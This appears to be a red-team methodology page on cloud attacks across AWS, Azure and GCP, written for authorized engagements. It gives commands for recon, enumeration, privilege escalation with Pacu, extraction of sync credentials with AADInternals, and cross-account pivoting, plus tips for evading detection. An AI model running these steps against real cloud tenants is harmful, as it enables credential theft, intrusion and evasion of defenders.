# Cloud Attack Methodology
> **Category**: Methodology
> **Platforms**: AWS / Azure / GCP
> **OPSEC Risk**: Varies by phase
> **Relevance**: Every cloud engagement; foundational strategy

## Strategic Overview

Cloud environments invert traditional assumptions. The perimeter dissolves into identity,
networking becomes software-defined, and the blast radius of a single credential can
span hundreds of services. Red team leads must internalize the shared responsibility
model: the provider secures *of* the cloud; the customer secures *in* the cloud. Our
attack surface lives in that gap.

### Cloud Kill Chain vs Traditional Kill Chain

| Traditional Kill Chain       | Cloud Kill Chain                          |
|------------------------------|-------------------------------------------|
| Reconnaissance               | Tenant/Account Discovery & Benchmarking   |
| Weaponization                | Credential Harvesting / Token Theft       |
| Delivery                     | Phishing / SSRF / CI-CD Compromise        |
| Exploitation                 | API Abuse / Misconfiguration Exploitation |
| Installation                 | Persistence via IAM / Serverless Backdoor |
| Command & Control            | Cloud-native C2 (Lambda, Functions, Run)  |
| Actions on Objectives        | Data Exfil via Storage Services / Egress  |

## Phase 1 -- Benchmark & Reconnaissance

Identify which clouds the target uses and map the external footprint.

```bash
# DNS enumeration for cloud services
dig +short CNAME target.com                      # Azure: *.azurewebsites.net, AWS: *.amazonaws.com
host -t MX target.com                            # Microsoft 365 => Azure AD tenant likely
nslookup -type=TXT _amazonses.target.com         # SES usage confirms AWS

# Tenant discovery - Azure
curl -s "https://login.microsoftonline.com/target.com/.well-known/openid-configuration" | jq .token_endpoint
# Extracts tenant GUID

# AWS account ID from public S3 buckets or error messages
aws s3 ls s3://target-public-bucket --no-sign-request 2>&1

# GCP project discovery via exposed APIs
curl -s "https://www.googleapis.com/storage/v1/b/target-bucket" 2>&1
```

## Phase 2 -- Authenticated Enumeration

Once credentials are obtained, enumerate everything methodically.

```bash
# AWS - Identify who you are, then enumerate
aws sts get-caller-identity
aws iam list-users
aws iam list-roles
aws ec2 describe-instances --region us-east-1
aws s3api list-buckets
aws lambda list-functions --region us-east-1

# Azure - Enumerate subscription and resources
az account list
az ad user list --query "[].{UPN:userPrincipalName,ID:objectId}"
az resource list --output table
az vm list --output table

# GCP - Project and IAM enumeration
gcloud projects list
gcloud iam service-accounts list
gcloud compute instances list
gcloud functions list
```

## Phase 3 -- Exposure Analysis

Identify publicly accessible resources and misconfigurations.

```bash
# AWS - Public S3 buckets
aws s3api get-bucket-acl --bucket target-bucket
aws s3api get-bucket-policy --bucket target-bucket
aws ec2 describe-security-groups --filters "Name=ip-permission.cidr,Values=0.0.0.0/0"

# Azure - Public storage blobs
az storage account list --query "[?allowBlobPublicAccess==true]"
az network nsg rule list --nsg-name target-nsg --resource-group target-rg \
  --query "[?sourceAddressPrefix=='*' && access=='Allow']"

# GCP - Public GCS buckets
gsutil iam get gs://target-bucket
gcloud compute firewall-rules list --filter="sourceRanges=0.0.0.0/0"
```

## Phase 4 -- Permission Escalation

Abuse IAM misconfigurations to escalate privileges within the cloud environment.

```bash
# AWS - Check for dangerous permissions
# Use Pacu for automated escalation
pacu> run iam__enum_permissions
pacu> run iam__privesc_scan

# Azure - Check current role assignments
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --all
# Look for paths: Contributor -> Owner, App Admin -> Global Admin

# GCP - Check IAM bindings for escalation paths
gcloud projects get-iam-policy PROJECT_ID --format=json
# Look for: setIamPolicy, serviceAccountKeys.create, actAs permissions
```

## Phase 5 -- Integration Exploitation

Pivot between cloud and on-premises environments.

```bash
# Azure AD Connect - Extract credentials from sync server
# On compromised AD Connect server:
Import-Module AADInternals
Get-AADIntSyncCredentials    # Returns Azure AD Global Admin creds

# AWS SSO to on-prem - If AWS SSO federated with on-prem AD
# Compromised SAML IdP => forge SAML to any AWS role

# Cross-account movement (AWS)
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT2:role/CrossAccountRole \
  --role-session-name lateral-move

# Cross-subscription (Azure)
az account set --subscription "Target-Subscription-ID"
```

## Multi-Cloud Engagement Strategy

| Consideration              | Approach                                       |
|----------------------------|------------------------------------------------|
| Scoping                    | Map all cloud accounts/subscriptions/projects  |
| Credential management      | Isolate credentials per provider               |
| Logging awareness          | CloudTrail / Activity Log / Cloud Audit Logs   |
| Exfiltration paths         | Use native cloud transfer (S3 cp, az copy)     |
| Deconfliction              | Timestamp all actions; use unique session names |

## Detection & Evasion

- **Detection**: Cloud-native SIEM (Sentinel, Security Hub, SCC) correlates API calls
- **Evasion**: Use regions/locations with less monitoring coverage
- **Evasion**: Perform actions during business hours to blend with normal API traffic
- **Evasion**: Use cloud-native services for C2 to avoid network-level detection

## Cross-References

- [AWS Initial Access](aws/aws-initial-access.md)
- [Azure Initial Access](azure/azure-initial-access.md)
- [GCP Initial Access](gcp/gcp-initial-access.md)
- [Cloud Tools Reference](cloud-tools.md)

## References

- MITRE ATT&CK Cloud Matrix: https://attack.mitre.org/matrices/enterprise/cloud/
- Hacking the Cloud: https://hackingthe.cloud
- Cloud Security Alliance: https://cloudsecurityalliance.org
- Shared Responsibility Models: AWS/Azure/GCP documentation
